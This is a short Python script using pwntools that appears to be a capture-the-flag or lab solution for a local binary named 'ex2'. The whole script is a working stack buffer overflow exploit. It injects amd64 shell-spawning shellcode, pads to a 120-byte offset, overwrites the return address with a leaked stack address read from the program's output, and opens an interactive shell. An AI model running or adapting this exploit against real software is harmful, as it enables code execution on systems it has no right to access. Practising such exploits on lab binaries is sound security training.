from pwn import *

context(os="linux", arch="amd64")
shellcode = asm(shellcraft.amd64.sh())
payload = shellcode.ljust(112 + 8, b"A")  # 64位 +8

p = process("./ex2")
p.recvuntil(b"[")
buf = p.recvuntil(b"]", drop=True)

payload += p64(int(buf, 16))
p.sendline(payload)

p.interactive()
